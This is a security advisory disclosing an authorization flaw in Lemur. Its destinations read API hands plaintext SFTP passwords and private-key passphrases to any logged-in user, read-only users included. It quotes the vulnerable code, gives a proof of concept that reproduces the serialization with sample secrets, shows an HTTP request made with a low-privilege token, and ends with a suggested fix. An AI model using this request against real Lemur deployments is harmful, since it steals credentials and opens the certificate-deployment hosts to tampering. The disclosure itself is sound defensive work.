# Lemur: Authenticated low-privilege users can read plaintext destination credentials (SFTP password / private-key passphrase) via the destinations API

- CWE: CWE-862
- Packages: pip:lemur

---

### Summary
Lemur's destination read endpoints -- `GET /api/1/destinations` and `GET /api/1/destinations/<id>` -- return the full set of stored plugin option values to any authenticated user, with no authorization check and no redaction of secret-bearing options. The sibling write endpoints (`POST`/`PUT`/`DELETE`) are gated with `@admin_permission.require(http_exception=403)`, but the two read handlers are protected only by `login_required` (inherited from `AuthenticatedResource`). They do not even exclude `read-only` users.

The built-in SFTP destination plugin (`sftp-destination`) stores its `password` and `privateKeyPass` options in cleartext in the `destinations.options` column (the plugin's own docstring states "Passwords are not encrypted and stored as a plain text."). Because `DestinationOutputSchema` serializes every option value verbatim, any authenticated principal -- including a `read-only` user -- can retrieve these credentials and use them to authenticate to the remote SFTP server to which Lemur deploys certificates.

### Details
Read endpoints lack the authorization that their write siblings enforce:

`lemur/destinations/views.py`
```python
class DestinationsList(AuthenticatedResource):
    @validate_schema(None, destinations_output_schema)
    def get(self):                       # <-- only login_required; no admin/read-only gate
        ...
        return service.render(args)

    @validate_schema(destination_input_schema, destination_output_schema)
    @admin_permission.require(http_exception=403)   # write path IS gated
    def post(self, data=None): ...

class Destinations(AuthenticatedResource):
    @validate_schema(None, destination_output_schema)
    def get(self, destination_id):       # <-- only login_required; no admin/read-only gate
        return service.get(destination_id)

    @validate_schema(destination_input_schema, destination_output_schema)
    @admin_permission.require(http_exception=403)   # write path IS gated
    def put(self, destination_id, data=None): ...

    @admin_permission.require(http_exception=403)   # write path IS gated
    def delete(self, destination_id): ...
```

The output schema emits all option values, including secret ones:

`lemur/destinations/schemas.py`
```python
class DestinationOutputSchema(LemurOutputSchema):
    ...
    options = fields.List(fields.Dict())          # raw option dicts, incl. {"name":"password","value":...}

    @post_dump
    def fill_object(self, data):
        if data:
            data["plugin"]["pluginOptions"] = data["options"]   # copied verbatim into plugin block too
            ...
        return data
```

`options` is the raw `JSONType` DB column (`lemur/destinations/models.py`), stored exactly as the plugin saved it. The SFTP plugin stores plaintext credentials:

`lemur/plugins/lemur_sftp/plugin.py`
```python
"""
    Passwords are not encrypted and stored as a plain text.
"""
options = [
    ...
    {"name": "password",       "type": "str", "required": False, ...},   # plaintext
    {"name": "privateKeyPass", "type": "str", "required": False, ...},   # plaintext
    ...
]
```

There is no `read-only` enforcement on these GET handlers (no `StrictRolePermission()` call), so even users explicitly restricted to read-only access can read the secrets.

### PoC
Reproduction of Lemur's exact serialization path (verbatim `DestinationOutputSchema` + `PluginOutputSchema`, marshmallow 2.21.0), fed a stored SFTP destination row with password auth:

```python
from marshmallow import fields, post_dump, Schema

class PluginOutputSchema(Schema):                 # verbatim from lemur/schemas.py
    id = fields.Integer(); label = fields.String(); description = fields.String()
    active = fields.Boolean(); options = fields.List(fields.Dict(), dump_to="pluginOptions")
    slug = fields.String(); title = fields.String()

class DestinationOutputSchema(Schema):            # verbatim from lemur/destinations/schemas.py
    id = fields.Integer(); label = fields.String(); description = fields.String()
    active = fields.Boolean(); plugin = fields.Nested(PluginOutputSchema)
    options = fields.List(fields.Dict())
    @post_dump
    def fill_object(self, data):
        if data:
            data["plugin"]["pluginOptions"] = data["options"]
            for option in data["plugin"]["pluginOptions"]:
                if "export-plugin" in option["type"]:
                    option["value"]["pluginOptions"] = option["value"]["plugin_options"]
        return data

class Destination:                                # a stored SFTP destination row
    id = 4; label = "prod-nginx-sftp"; description = "Deploy certs via SFTP"; active = True
    options = [
        {"name": "host", "type": "str", "value": "10.0.5.20"},
        {"name": "user", "type": "str", "value": "deploy"},
        {"name": "password", "type": "str", "value": "S3cr3t-SFTP-Passw0rd!"},
        {"name": "privateKeyPass", "type": "str", "value": "rsa-key-passphrase-xyz"},
    ]
    plugin = {"slug": "sftp-destination", "title": "SFTP",
              "description": "Allow the uploading of certificates to SFTP",
              "options": [], "id": 1, "label": None, "active": None}

out = DestinationOutputSchema().dump(Destination()).data
import json; print(json.dumps(out))
assert "S3cr3t-SFTP-Passw0rd!" in json.dumps(out)
assert "rsa-key-passphrase-xyz" in json.dumps(out)
```

Output (truncated) -- the plaintext secrets appear in both `options` and `plugin.pluginOptions`:
```json
{"options":[ ... {"name":"password","type":"str","value":"S3cr3t-SFTP-Passw0rd!"},
 {"name":"privateKeyPass","type":"str","value":"rsa-key-passphrase-xyz"} ...],
 "plugin":{"pluginOptions":[ ... {"name":"password","value":"S3cr3t-SFTP-Passw0rd!"} ...],
 "slug":"sftp-destination", ...}}
```

End-to-end, as a low-privilege (or read-only) user holding a normal Lemur JWT:
```
GET /api/1/destinations/4 HTTP/1.1
Host: lemur.example.com
Authorization: Bearer <low-priv-user-token>

HTTP/1.1 200 OK
{ "plugin": { "pluginOptions": [ ... {"name":"password","value":"S3cr3t-SFTP-Passw0rd!"} ... ] } }
```

### Impact
Confidentiality breach of deployment credentials. Any authenticated Lemur user -- regardless of role, including users intentionally limited to `read-only` -- can enumerate all configured destinations and read their plaintext secrets. For SFTP destinations this yields the SSH password and/or the passphrase protecting the RSA key Lemur uses to push certificates. With these, an attacker authenticates directly to the remote certificate-deployment hosts, replacing or reading their TLS material -- a scope change beyond Lemur itself (S:C). The same read path exposes any other secret-bearing option a destination plugin stores in cleartext.

Suggested fix: gate the destination GET handlers with `admin_permission` (consistent with the write handlers), and/or redact option values whose type/name marks them as secret before serialization in `DestinationOutputSchema`.
